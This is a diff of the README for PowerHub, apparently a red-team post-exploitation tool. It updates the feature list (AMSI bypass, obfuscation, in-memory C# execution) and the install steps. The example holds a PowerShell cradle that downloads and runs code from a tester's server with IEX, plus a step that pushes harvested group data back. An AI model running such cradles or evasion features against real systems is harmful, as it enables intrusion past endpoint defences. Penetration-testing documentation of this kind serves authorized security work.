@@ -11,9 +11,11 @@ endpoint protection. Check out the
 * Cert pinning
 * String "obfuscation" by RC4 encryption
 * Choose your AMSI Bypass
+* Transparent aliases for in-memory execution of C# programs
 
 
 ![PowerHub Webapp](https://github.com/AdrianVollmer/PowerHub/blob/master/img/powerhub-webapp.png)
+![PowerHub Webapp](https://github.com/AdrianVollmer/PowerHub/blob/master/img/powerhub-sharphound.png)
 
 During an engagement where you have a test client available, one of the
 first things you want to do is run PowerSploit. So you need to download the
@@ -31,56 +33,40 @@ team.
 Here is a simple example (grab information about local groups with PowerView
 and transfer it back):
 
-```
-PS C:\Users\avollmer> $K=new-object net.webclient;IEX $K.downloadstring('http://192.168.11.2:8080/0?t=http&f=r&a=reflection');
+```powershell
+PS C:\Users\avollmer> $K=New-Object Net.WebClient;'a=reflection','t=http'|%{IEX $K.DownloadString('http://192.168.11.2:8080/0?'+$_)}
+True
   _____   _____  _  _  _ _______  ______ _     _ _     _ ______
  |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
  |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
-                            written by Adrian Vollmer, 2018-2021
+1.11                        written by Adrian Vollmer, 2018-2022
 Run 'Help-PowerHub' for help
-PS C:\Users\avollmer> lhm powerview
-Name                                Type N  Loaded
-----                                ---- -  ------
-ps1/PowerSploit/Recon/PowerView.ps1 ps1  29   True
-PS C:\Users\avollmer> Get-LocalGroup | pth -Name groups.json
+PS C:\Users\avollmer> Get-HubModule PowerView
+
+
+Name   : /home/avollmer/.local/share/powerhub/modules/PowerSploit/Recon/PowerView.ps1
+Type   : ps1
+N      : 205
+Loaded : True
+Alias  :
+
+PS C:\Users\avollmer> Get-LocalGroup | PushTo-Hub -Name groups.json
 ```
 
 
 Installation
 ============
 
-PowerHub itself does not need to be installed. Just execute `powerhub.py`.
-However, there are a few dependencies. They are listed in the
-[requirements.txt](https://github.com/AdrianVollmer/PowerHub/blob/master/requirements.txt).
-Install them either via `pip3 install --user -r requirements.txt` or use a
-virtual environment.
+PowerHub can be installed like any other Python package. Just execute
+`python3 -m pip install powerhub`. If you like to work with virtual
+environments, I recommend [pipx](https://github.com/pypa/pipx/).
 
-If you do want to install PowerHub, you should do `pip3 install --user .`.
-
-Python2 is not supported.
+If you want to use the latest version on the dev branch, clone this
+repository and install with `python3 -m pip install -e .`.
 
 For building the payloads, you need the MinGW GCC and Mono C# compilers. On
 Debian-like systems, you can install them with `apt-get install mono-mcs
 gcc-mingw-w64-x86-64 gcc-mingw-w64-i686`.
-
-venv
-----
-
-`venv` can be installed on Debian-like systems by `apt install
-python3-venv`.
-
-Run `python3 -m venv env` to create a virtual environment, then use `source
-env/bin/activate` to activate it. Now run `pip3 install .`
-to install the depencendies inside the virtual environment.
-
-pipenv
-------
-
-Alternatively, you can use `pipenv`. `pipenv` can be installed on
-Debian-like systems by `apt install pipenv`.
-
-Run `pipenv install` once in the PowerHub directory, then `pipenv shell` to
-activate the virtual environment.
 
 
 Usage
@@ -93,7 +79,7 @@ generated password will be used for basic authentication. The switch
 callback host name is used by the stager to download the payload. If the
 callback port or path differ from the default, it can also be changed.
 
-Read `./powerhub.py --help` and the [Wiki](https://github.com/AdrianVollmer/PowerHub/wiki/Usage) for details.
+Read `powerhub --help` and the [Wiki](https://github.com/AdrianVollmer/PowerHub/wiki/Usage) for details.
 
 
 Credits
